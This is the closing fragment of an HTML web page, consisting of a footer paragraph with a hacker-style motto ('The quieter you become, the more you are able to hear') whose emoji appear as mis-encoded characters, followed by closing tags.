<p>        ‚ö†Ô∏è The quieter you become, the more you are able to hear ü•∑</p>
</footer>

</body>
</html>